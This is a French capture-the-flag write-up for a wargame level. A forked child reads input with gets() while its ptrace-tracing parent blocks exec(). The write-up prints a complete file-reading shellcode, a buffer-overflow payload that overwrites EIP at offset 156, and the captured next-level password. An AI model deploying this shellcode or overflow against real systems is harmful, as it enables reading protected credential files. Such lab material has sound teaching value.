Ce binaire est particulier. 
Tout d'abord un buffer de 32 bytes est declare. Ensuite, le programme fait un `fork`. 
Il va donc se derouler en deux "sous-parties" :

**Le fils :**

Le fils va faire un appel un ptrace() afin qu'il soit trace par le pere et qu'ils puissent "echanger" des signaux.

`ptrace(0, 0, NULL, NULL);`

Ensuite, une string indiquant `Give me some shellcode, k` va etre afficher grace a un puts, puis, via un gets() nous allons 
etre invite a remplir le buffer de 32 bytes : 

    puts("Give me some shellcode, k");
    gets(str);
    
gets() est bien entendu vulnerable aux BoF.

**Le pere :**

Le pere, quant a lui, va se mettre en wait() afin d'attendre que le processus fils s'execute (autrement dit, il va attendre qu'on utilise gets) 
puis en suite il va exit. Cependant, grace a ptrace(), il va aussi verifier que le fils n'utilise pas de syscall `exec()`, auquel cas, nous avons un joli
`no exec() for you` puis un kill.

Nous savons maintenant que nous ne pourrons pas executer un shellcode avec pour instruction "exec".
Le trick sera donc de trouver un shellcode permettant de lire dans un fichier (dans notre cas, /home/users/level05/.pass)

En voici un : http://shell-storm.org/shellcode/files/shellcode-73.php

`export TOTO=$(python -c "print('\x90'*100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass')")`

Nous avons juste besoin de l'offset necessaire pour ecraser EIP, puis de l'adresse de notre shellcode.
Apres plusieurs tentatives de `print('A'*x)` nous pouvons en deduire que l'offset est de 156.

Nous avons donc notre payload final :

`python -c "print('A'*156 + '\x50\xd8\xff\xff')"`


`level04@OverRide:~$ python -c "print('A'*156 + '\x50\xd8\xff\xff')" | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...`
